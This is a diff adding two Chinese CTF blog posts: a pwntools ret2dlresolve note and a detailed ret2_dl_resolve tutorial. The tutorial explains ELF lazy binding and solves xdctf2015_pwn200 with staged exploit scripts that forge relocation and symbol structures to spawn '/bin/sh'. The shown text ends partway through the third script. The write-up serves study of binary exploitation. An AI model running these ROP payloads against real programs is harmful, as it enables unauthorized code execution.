@@ -155,6 +155,295 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/pwntools/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/13/pwntools/" class="post-title-link" itemprop="url">pwntools</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-13 16:46:52" itemprop="dateCreated datePublished" datetime="2022-02-13T16:46:52+08:00">2022-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-08 03:24:42" itemprop="dateModified" datetime="2022-03-08T03:24:42+08:00">2022-03-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="记录一下pwntools的模块"><a href="#记录一下pwntools的模块" class="headerlink" title="记录一下pwntools的模块"></a>记录一下pwntools的模块</h3><h4 id="pwnlib-rop-ret2dlresolve"><a href="#pwnlib-rop-ret2dlresolve" class="headerlink" title="pwnlib.rop.ret2dlresolve"></a><a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/rop/ret2dlresolve.html#module-pwnlib.rop.ret2dlresolve"><code>pwnlib.rop.ret2dlresolve</code></a></h4><p>自动化生成ret2dlresolve的payload，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./binary&quot;</span>)</span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"><span class="comment">#这里是要执行的函数及其参数</span></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(<span class="string">&quot;./binary&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">payload = flat(&#123;<span class="number">112</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line"><span class="comment">#这里的两个数字分别的padding的长度、输入函数的最大输入字节数</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如以下示例程序中（32位），padding_length = 64+4、最大输入字节数 = 256</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/04/ret2_dl_resolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/04/ret2_dl_resolve/" class="post-title-link" itemprop="url">ret2_dl_resolve</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-04 04:39:18" itemprop="dateCreated datePublished" datetime="2022-02-04T04:39:18+08:00">2022-02-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-04 13:52:11" itemprop="dateModified" datetime="2022-03-04T13:52:11+08:00">2022-03-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>这篇文章从<a target="_blank" rel="noopener" href="https://study.163.com/course/courseMain.htm?courseId=1212430806&_trace_c_p_k2_=5f25e3cfc98742df8494d8a0a8c8bc12">HWS计划2020安全精英夏令营</a>、[ctf wiki](<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/#pwntools">ret2dlresolve - CTF Wiki (ctf-wiki.org)</a>)以及[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37572651">新手向]ret2dl-resolve详解 - 知乎 (zhihu.com)</a>中整理写出</p>
+<ul>
+<li><p>32位下</p>
+<ul>
+<li><p>ELF 程序的基本相关结构</p>
+<ul>
+<li><p>ELF 可执行文件由 ELF 头部，程序头部表和其对应的段，节区头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为 <strong>PT_DYNAMIC</strong> 的段，其包含 <strong>.dynamic</strong> 节区。结构如下（32位为例）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">	ELF32_Sword d_tag;</span><br><span class="line">	union&#123;</span><br><span class="line">		ELF32_Word	d_val;</span><br><span class="line">		ELF32_Addr	d_ptr;</span><br><span class="line">	&#125; d_un;</span><br><span class="line">&#125; ELF32_Dyn;</span><br></pre></td></tr></table></figure></li>
+<li><p>节区中包含目标文件所有信息</p>
+</li>
+<li><p>如图，列出了某个文件的28个节区。其中类型为 REL 的节区包含重定位表项</p>
+<img src="/2022/02/04/ret2_dl_resolve/readelf-1.jpg" class>
+
+<img src="/2022/02/04/ret2_dl_resolve/readelf-2.jpg" class>
+
+<ul>
+<li><p>.dynamic 包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针，可以<code>readelf -S hellopwn</code>看一下，会发现这三个section的地址跟在下图所示的地址是一样的。</p>
+<img src="/2022/02/04/ret2_dl_resolve/dynamic.jpg" class></li>
+<li><p>其中 .rel.plt 节是<strong>函数</strong>重定位表，也是一个结构体数组，每个项对应一个导入函数，结构体定义如下。.rel.dyn 节用于<strong>变量</strong>重定位</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	ELF32_Addr r_offset;	<span class="comment">//对于可执行文件，此值为虚拟地址</span></span><br><span class="line">	ELF32_Word r_info;		<span class="comment">//符号表索引</span></span><br><span class="line">&#125; ELF32_Rel;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(i) ((i)&gt;&gt;8)		<span class="comment">//该宏定义将传进来的值右移8位（去掉低一字节）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_TYPE(i) ((unsigned char)(i))	<span class="comment">//该宏定义取传进来的值的低一字节</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_INFO(s,t) (((s)&lt;&lt;8) + (unsigned char)(t))</span></span><br></pre></td></tr></table></figure>
+
+<p>我们用 readelf -r 即可查看目标文件 REL 节区的相关信息</p>
+<img src="/2022/02/04/ret2_dl_resolve/readelf-3.jpg" class>
+
+<p>对于导入函数来说，其 r_info 的最低一字节都是 0x7</p>
+</li>
+<li><p>.got 节保存全局变量偏移表，.got.plt 节存储着全局函数偏移表。.got.plt 对应着 ELF32_Rel 结构中 r_offset 的值。例如上图中 REL 节区中的 write 函数，其 r_offset = 0x804a010，即其在got表中位于 0x804a010 </p>
+<img src="/2022/02/04/ret2_dl_resolve/got.plt.jpg" class></li>
+<li><p>.dynsym 节区包含了动态链接符号表（结构体数组）每个项同样对应一个导入函数。其中，ELF32_Sym[num]中的 num 对应着 <code>ELF32_R_SYM(ELF32_Rel-&gt;r_info)</code>。根据定义，<code>ELF32_R_SYM(ELF32_Rel-&gt;r_info) = ELF32_Rel-&gt;r_info &gt;&gt; 8</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; <span class="comment">// 符号名，是相对.dynstr起始的偏移</span></span><br><span class="line">    Elf32_Addr st_value;</span><br><span class="line">    Elf32_Word st_size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">    Elf32_Section st_shndx;</span><br><span class="line">&#125; Elf32_Sym; <span class="comment">//对于导入函数符号而言，未标注的字段都是0</span></span><br></pre></td></tr></table></figure>
+
+<p>注意一个 ELF32_Sym 结构体的大小为 0x10 个字节</p>
+<p>例如当程序想查找一个函数对应的 ELF32_Sym 结构体时，就会在取出其 ELF32_Rel-&gt;r_info 的值并用 ELF32_R_SYM() 操作（即右移8位），由此得出下标num。</p>
+<p>例如上图中 REL 节区中的 write 函数，其 r_info = 0x507，<code>ELF32_R_SYM(ELF32_Rel-&gt;r_info) = 0x507 &gt;&gt; 8 = 5</code>，而 ELF32_Sym[5] 即保存着write的符号表信息。</p>
+<p>用 readelf -s 就能查看 Sym 结构</p>
+<img src="/2022/02/04/ret2_dl_resolve/readelf-4.png" class>
+
+<p>并且 <code>ELF32_R_TYPE(0x507) = 7</code>，对应 <code>R_386_JUMP_SLOT</code></p>
+</li>
+<li><p>.dynstr 节包含了动态链接所需的字符串。这个节区以 \x00 作为开始和结束，中间每个字符串也以 \x00 间隔。相关数据结构引用一个字符串时，用的是<strong>相对这个section头的偏移</strong>，比方说，在这里，就是字符串相对0x804821C的偏移。</p>
+<img src="/2022/02/04/ret2_dl_resolve/dynstr.jpg" class></li>
+<li><p>.plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</p>
+<p>程序call一个函数的plt时，执行流如下（以write函数为例）：</p>
+<p>call write@plt -&gt; 跳转至 0x80483c0 执行，该地址处有三条汇编代码，如下：</p>
+<img src="/2022/02/04/ret2_dl_resolve/call_plt.png" class>
+
+<p>而 0x804a010 处是write的got表的位置，在ELF采用延迟绑定技术时，程序还未执行过某个函数时，该函数的got表内存放的是该函数 plt+6 的地址，如下：</p>
+<img src="/2022/02/04/ret2_dl_resolve/first_got.png" class>
+
+<p>所以程序就相当于继续执行 0x80483c6 处的汇编，把 _dl_runtime_resolve() 的第二个参数 <strong>reloc_arg = 0x20</strong> 作为参数压栈，然后 <code>jmp 0x8048370</code>，该地址处的汇编代码如下：</p>
+<img src="/2022/02/04/ret2_dl_resolve/call_dl_resolve.jpg" class>
+
+<p>0x8048370 再把 *<em>link_map = <em>(GOT+4)</em></em> 压栈（整个got表+4的位置，这个位置是一个link_map的指针，是在程序加载的时候就写入的。link map这个结构我们不关心，但是要知道它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section）</p>
+<img src="/2022/02/04/ret2_dl_resolve/GOT+4.jpg" class>
+
+<p>而 *(GOT+8) 中保存的是 _dl_runtime_resolve() 函数的地址，由此就相当于执行了 <code>_dl_runtime_reslove(link_map,reloc_arc)</code>，由该函数完成符号的解析，将write函数的真实地址写入其got表中，随后把控制权交给write函数</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>其中 _dl_runtime_resolve() 是在 glibc-2.22/sysdeps/i386/dl-trampoline.S 中用汇编实现的，其代码如下</p>
+<img src="/2022/02/04/ret2_dl_resolve/dl_resolve_ass.png" class>
+
+<p>0xf7fee00b 处即调用 <code>_dl_fixup</code>，并且通过寄存器传参。<code>_dl_fixup</code>是在 glibc-2.22/elf/dl_runtime.c 实现的，我们只需要关注一些主要函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ELFW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>首先通过参数 reloc_arg 计算重定位入口，这里的<code>JMPREL</code>即<code>.rel.plt</code>，<code>reloc_offset</code>即<code>reloc_arg</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l,l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>
+
+<p>所以由此得出的 reloc 就是该函数在 .rel.plt 节所对应的结构体</p>
+</li>
+<li><p>然后通过 reloc-&gt;r_info 找到 .dynsym 中对应的条目</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ELFW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM)(reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>
+
+<p>其中 symtab[] 就是 .dynsym 中的结构体数组，由 <code>ELFW(R_SYM)(reloc-&gt;r_info)</code> 该步操作得出其下标（<code>ELFW(R_SYM)(i)</code>是前面讲过的宏定义），最后取地址赋值给指针 sym，该操作在介绍 .dynsym 节的内容时已经讲过</p>
+<p>这里还会检查 reloc-&gt;r_info 的最低位是不是等于 <code>R_386_JUMP_SLOT</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure></li>
+<li><p>接着通过 strtab + sym-&gt;st_name 找到符号表字符串，result为libc基址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name,l,&amp;sym,l-&gt;l_scope,version,ELF_RTYPE_CLASS_PLT,flags,NULL);</span><br></pre></td></tr></table></figure></li>
+<li><p>value为libc基址加上要解析的函数的偏移地址，由此得到实际地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (result,sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br></pre></td></tr></table></figure>
+
+<p>由此步我们得知其实最后决定value的值的是函数经过前面层层步骤最后得到的函数名字的字符串，函数会用得到的要解析的函数名称的字符串去表里寻找，从而匹配得到要解析的函数的真实地址。</p>
+</li>
+<li><p>最后把value写入相应的got表条目中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return elf_machine_fixup_plt (l,result,reloc.rel_addr,value);</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>漏洞利用流程</p>
+<ol>
+<li>控制 EIP 为 PLT[0] 的地址，只需要传递一个 reloc_arg 参数</li>
+<li>控制 reloc_arg 的大小，使 reloc 的位置落在可控地址内</li>
+<li>伪造 reloc 的内容，使 sym 落在可控地址内</li>
+<li>伪造 sym 的内容，使 name 落在可控地址内</li>
+<li>伪造 name 为任意库函数名称，如 system</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><p>以这道经典例题为例一步步理解漏洞的利用流程</p>
+<p>程序保护如下</p>
+<img src="/2022/02/04/ret2_dl_resolve/pwn200-checksec.jpg" class>
+
+<p>RELRO没有全开是ret2_dl_resolve所必须的条件之一</p>
+<p>main函数如下</p>
+<img src="/2022/02/04/ret2_dl_resolve/pwn200-main.png" class>
+
+<p>vuln函数如下</p>
+<img src="/2022/02/04/ret2_dl_resolve/pwn200-vuln.jpg" class>
+
+<p>漏洞只是一个栈溢出，接下来我们尝试一步一步完成ret2_dl_resolve的攻击流程</p>
+<h5 id="stage-1"><a href="#stage-1" class="headerlink" title="stage 1"></a>stage 1</h5><p>我们将栈迁移到 .bss 段，然后尝试用伪造的 Rel 结构体来让 _dl_runtime_resolve 函数成功解析，这部分的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">pop_ebp = <span class="number">0x0804862b</span></span><br><span class="line">p3_ret = <span class="number">0x08048629</span></span><br><span class="line">leave_ret = <span class="number">0x0804851A</span></span><br><span class="line">binsh = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">base_stage = bss_addr + <span class="number">0x800</span></span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span></span><br><span class="line">plt0 = <span class="number">0x08048370</span></span><br><span class="line"></span><br><span class="line">rel_plt = <span class="number">0x08048324</span></span><br><span class="line">r_info = <span class="number">0x607</span></span><br><span class="line">fake_rel = p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span> <span class="comment">#28是fake_rel在base_stage中的偏移</span></span><br><span class="line">reloc_arg = fake_rel_addr - rel_plt</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(p3_ret) + p32(<span class="number">0</span>) + p32(base_stage) + p32(<span class="number">0x100</span>) + p32(pop_ebp) + p32(base_stage) + p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(plt0)</span><br><span class="line">payload += p32(reloc_arg)</span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(binsh))</span><br><span class="line"><span class="comment">#fake_rel</span></span><br><span class="line">payload += fake_rel</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += binsh</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/04/ret2_dl_resolve/pwn200-task1.jpg" class>
+
+<p>可见我们伪造的 Rel 结构体同样能让程序成功解析并输出’/bin/sh’字符串，其中exp中的所需信息用 <code>readelf</code> 去找即可。</p>
+<h5 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h5><p>在上一阶段中我们伪造的 Rel 结构体与write函数原本的 Rel 结构体完全相同。接下来尝试更改伪造的 r_info 使得程序用我们伪造的 Sym 结构体去寻找我们控制的 st_name。</p>
+<p>我们先查看write函数原本对应的 Sym 结构体是怎样的，我们查看了write函数的 r_info = 0x607，<code>0x607 &gt;&gt; 8 = 0x6 </code>，所以write函数对应的 Sym 结构体是 .dynsym 节的第七个，因为一个 ELF32_Sym 结构体的大小为 0x10 个字节，所以也可以算出其地址为 <code>dynsym_addr + (0x607&gt;&gt;8)*0x10</code>，我们再查看 .dynsym 节</p>
+<img src="/2022/02/04/ret2_dl_resolve/pwn200-task2.png" class>
+
+<p>由此我们得知了write函数所对应的 st_name = 0x4c</p>
+<p>这部分exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">r_info = ((fake_sym_addr - dynsym)/<span class="number">0x10</span>&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_rel = p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_rel_addr = base_stage + <span class="number">28</span></span><br><span class="line">reloc_arg = fake_rel_addr - rel_plt</span><br><span class="line"></span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span> + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(p3_ret) + p32(<span class="number">0</span>) + p32(base_stage) + p32(<span class="number">0x100</span>) + p32(pop_ebp) + p32(base_stage) + p32(leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(plt0)</span><br><span class="line">payload += p32(reloc_arg)</span><br><span class="line">payload += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(binsh))</span><br><span class="line"><span class="comment">#fake_rel</span></span><br><span class="line">payload += fake_rel</span><br><span class="line"><span class="comment">#fake_sym</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*align</span><br><span class="line">payload += fake_sym</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += binsh</span><br><span class="line">payload = payload.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>因为 Sym 结构体是根据 <code>&amp;symtab[ELFW(R_SYM)(reloc-&gt;r_info)]</code> 这样去找的，也就相当于 <code>dynsym + (reloc-&gt;r_info &gt;&gt; 8)*0x10</code> ，所以每个 Sym 结构体跟 .dynsym 节的起始地址的偏移都是按 0x10 个字节对齐的，即 <code>(fake_sym_addr - dynsym)%0x10 == 0</code> ，所以只要让 <code>(fake_sym_addr - dynsym)&amp;0xf + x = 0x10</code> 即可，这个 x 就是exp中作padding的align。</p>
+<p>同理，做个简单的逆运算即可得出 <code>r_info = ((fake_sym_addr - dynsym)/0x10 &lt;&lt; 8</code>，因为先左移了8位，所以直接 <code>|0x7</code> 来确保 r_info 的最低一字节是 0x7（知识点中说过会有一个检查）</p>
+<img src="/2022/02/04/ret2_dl_resolve/pwn200-task3.jpg" class>
+
+<p>可见用我们伪造的 Sym 结构体同样能让 _dl_runtime_resolve 函数完成解析，输出我们的’/bin/sh’</p>
+<h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>现在我们只差最后一步，即改变我们伪造的 Sym 结构体中的 st_name，使最后索引到的字符串是我们构造的字符串。因为符号表字符串是通过 strtab + sym-&gt;st_name 的方式找到的，所以这部分就很简单了，只需要稍微修改一下 stage2 的exp即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804826c</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">r_info = ((fake_sym_addr - dynsym)/<span class="number">0x10</span>&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_rel = 